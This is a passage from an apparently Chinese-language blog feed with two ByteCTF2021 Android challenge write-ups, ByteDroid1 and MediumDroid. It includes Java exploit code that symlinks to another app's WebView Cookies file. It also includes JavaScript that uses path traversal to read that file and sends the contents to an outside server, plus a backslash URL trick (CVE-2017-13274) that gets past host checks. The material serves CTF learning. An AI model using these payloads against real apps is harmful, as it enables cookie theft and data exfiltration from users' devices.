class="operator">=</span> <span class="string">&quot;/data/data/&quot;</span> + getPackageName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;&lt;h1&gt;Test&lt;/h1&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;script&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    async function fetchTest() &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        var response = await fetch(&#x27;http://bytectf.toutiao.com/local_cache/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fdata/data/com.bytectf.pwnbytedroid1/files/symlink.html&#x27;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        var responseText = await response.text();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        fetch(&#x27;http://111.xxxxxxx//?msg=&#x27;+ responseText.slice(responseText.search(&#x27;flag&#x27;),responseText.search(&#x27;flag&#x27;)+70) )\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    (async () =&gt; &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        await fetchTest();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;)();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">evilHtml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dataDir + <span class="string">&quot;/files/evil.html&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(evilHtml);</span><br><span class="line">        fileOutputStream.write(content.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createSymlink</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dataDir</span> <span class="operator">=</span> <span class="string">&quot;/data/data/&quot;</span> + getPackageName();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;rm -rf &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;mkdir &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/com.bytectf.bytedroid1/app_webview/Cookies&quot;</span> + <span class="string">&quot; &quot;</span> + dataDir + <span class="string">&quot;/files/symlink.html&quot;</span>).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260123160047927.png" alt="image-20260123160047927"></p><p>当然也可以不放在请求参数里</p><h3 id="方案二：CVE-2017-13274"><a href="#方案二：CVE-2017-13274" class="headerlink" title="方案二：CVE-2017-13274"></a>方案二：CVE-2017-13274</h3><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260123201617141.png" alt="image-20260123201617141"></p><p>2018 年 4 月左右修复 CVE-2017-13274（以及相关 URL&#x2F;host 解析不一致问题）的补丁</p><blockquote><p>“special” URL schemes (which is basically all commonly-used hierarchical schemes, including http, https, ftp, and file), the host portion ends if a \ character is seen, whereas this class previously continued to consider characters part of the hostname. 也就是说反斜杠\ 在CVE-2017-13274完成修复后会被视为Host的结束，而非Host的一部分。</p><p>也就是说可以通过构造<code>http://attacker.com\\.app.toutiao.com/bytedroid1.htm</code>l这样的路径来绕过Host的检测，使其直接访问远程的bytedroid1.html ，远程此时就可以通过路径穿越读取Cookies，前提也是要创建好symlink.html ，</p></blockquote><p>from LLeaves</p><p>可以反过来理解，这个就是让受害APP加载这个HTML去读symlink获得flag吗，这个挺好理解，问题是如何触发这个?</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchTest</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://bytectf.toutiao.com/local_cache/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fdata/data/com.bytectf.pwnbytedroid1/files/symlink.html&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> responseText = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://xxx.xxx.xxx.xxx:xxx&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">send</span>(<span class="string">&quot;file_content=&quot;</span> + <span class="built_in">encodeURIComponent</span>(responseText));</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;File content sent to server.&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetchTest</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li>ByteDroid1 的第一层校验到底在防什么</li></ol><p>MainActivity 入口只允许：</p><ul><li><code>scheme == http</code></li><li><code>host.endsWith(&quot;.toutiao.com&quot;)</code></li></ul><p>不满足就强制改成默认的 <code>http://bytectf.toutiao.com/local_cache/index.html</code></p><p>也就是说，你想让它<strong>加载你自己的远程恶意页面</strong>，正常情况下必须把 host 做成 <code>.toutiao.com</code> 才行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://attacker.com\\.app.toutiao.com/bytedroid1.html</span><br></pre></td></tr></table></figure><p>我们可以这样构造</p><p>它利用的是：在旧版本里，Java 的 Uri.getHost() 会把反斜杠 \ 当普通字符留在 host 里（或者至少不会在这里截断），于是得到的 host 类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker.com\\.app.toutiao.com</span><br></pre></td></tr></table></figure><p>这个字符串当然 endsWith(“.toutiao.com”) 为真，所以通过第一层校验。</p><p>但 WebView &#x2F; Chromium 的网络栈对 URL 的处理里，反斜杠常会被当成分隔符&#x2F;被规范化到 path 侧（不同版本细节有差异，但核心是：<strong>实际 HTTP 请求会发到 attacker.com</strong>），于是 WebView 真正加载的是：</p><ul><li><strong>host：attacker.com</strong></li><li>path：<code>\\.app.toutiao.com/bytedroid1.html</code></li></ul><p>结果：<strong>应用以为自己在加载 “*.toutiao.com”，实际 WebView 去拉了 attacker.com 上的页面</strong>。</p><p>这样修改可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//        intent.setData(Uri.parse(&quot;http://bytectf.toutiao.com/local_cache/..%2F..%2F..%2F..%2F..%2Fdata/data/com.bytectf.pwnbytedroid1/files/evil.html&quot;));</span></span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;http://xxxx:8000\\@.toutiao.com/bytedroid1.html&quot;</span>);</span><br><span class="line">        intent.setData(data);</span><br><span class="line">        Log.d(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getScheme:&quot;</span> + data.getScheme());</span><br><span class="line">        Log.d(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getHost:&quot;</span> + data.getHost());</span><br><span class="line">        Log.d(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getAuthority:&quot;</span> + data.getAuthority());</span><br><span class="line">        Log.d(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getUserInfo:&quot;</span> + data.getUserInfo());</span><br><span class="line">        Log.d(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getPath:&quot;</span> + data.getPath());</span><br><span class="line">        Log.d(<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;getQuery:&quot;</span> + data.getQuery());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createSymlink();</span><br><span class="line"><span class="comment">//            createHTML();</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260123210949011.png" alt="image-20260123210949011"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260123211037066.png" alt="image-20260123211037066"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-ByteDroid1复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-ByteDroid1复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 ByteDroid1复现&quot;&gt;&lt;/a&gt;ByteCTF2021 By</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 MediumDroid复现</title>
    <link href="http://matriy330.github.io/1411eb04/"/>
    <id>http://matriy330.github.io/1411eb04/</id>
    <published>2026-01-22T14:38:37.000Z</published>
    <updated>2026-01-23T13:12:35.641Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-MediumDroid复现"><a href="#ByteCTF2021-MediumDroid复现" class="headerlink" title="ByteCTF2021 MediumDroid复现"></a>ByteCTF2021 MediumDroid复现</h1><p>依旧学习：<a href="https://blog.lleavesg.top/article/ByteCTF-2021-MediumDroid#1474f9088c894c0ca5a93ccf8cdc7e15">ByteCTF2021 MediumDroid复现 | LLeaves Blog</a></p><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>跟easydroid差不多组件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.mediumdroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Mediumdroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.mediumdroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.mediumdroid.TestActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.mediumdroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><p>跟easydroid一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.mediumdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebViewClient;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            data = Uri.parse(<span class="string">&quot;http://app.toutiao.com/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (data.getAuthority().contains(<span class="string">&quot;toutiao.com&quot;</span>) &amp;&amp; data.getScheme().equals(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">            webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123; <span class="comment">// from class: com.bytectf.mediumdroid.MainActivity.1</span></span><br><span class="line">                <span class="meta">@Override</span> <span class="comment">// android.webkit.WebViewClient</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                    <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;intent&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            MainActivity.<span class="built_in">this</span>.startActivity(Intent.parseUri(url, <span class="number">1</span>));</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            setContentView(webView);</span><br><span class="line">            webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">            webView.loadUrl(data.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><p>跟之前一样接受flag写到一个目录下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.mediumdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TestActivity"><a href="#TestActivity" class="headerlink" title="TestActivity"></a>TestActivity</h3><p>这里跟上题不一样的点在于webView.addJavascriptInterface(this, “jsi”);和Te3t方法</p><p>addJavascriptInterface的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(javaObject, &quot;jsi&quot;);</span><br></pre></td></tr></table></figure><p>意思是：<strong>把一个 Java 对象暴露给 WebView 里的 JavaScript 使用</strong></p><ul><li>this → 当前 TestActivity实例</li><li>“jsi” → JavaScript 中访问这个对象的名字</li></ul><blockquote><p>这意味着可以在WebView渲染的网页中使用js调用Android类中的方法，但是前提必须要在可以使用js接口调用的方法前面加上@JavascriptInterface的声明，在该类中的Te3t即为可以使用js接口调用的方法。</p></blockquote><p>Te3t这个方法没有任何权限校验，参数 title &#x2F; content完全可控</p><p>要求是Android 8.0（API 26）后，须先创建 NotificationChannel 才能发通知，”CHANNEL_ID” 是后面 Builder 使用的 channel id，4等价于 IMPORTANCE_HIGH</p><p>通知标题，<strong>完全由 JS 控制</strong></p><blockquote><p>Te3t 则创建了一条通知，并且在创建通知的过程中使用PendingIntent.getBroadcast(this, 0, new Intent(), 0))， 该PendingIntent将执行一个广播操作，类似于调用Context.sendBroadcast()方法。通过获取这个PendingIntent，可以在任何时候以PendingIntent创建者APP的权限执行这个广播操作，而无需调用sendBroadcast()方法。方法原型public staticPendingIntent getBroadcast (Context context,int requestCode,Intent intent,int flags)</p></blockquote><p>普通 Intent 是什么？sendBroadcast(intent);</p><p>立刻发，只能由<strong>当前 App 自己</strong>发</p><p>PendingIntent 是什么？</p><blockquote><p><strong>一个授权凭证</strong>， 允许 <strong>别的进程 &#x2F; 系统</strong> 在以后以你的 App 身份执行一个 Intent</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 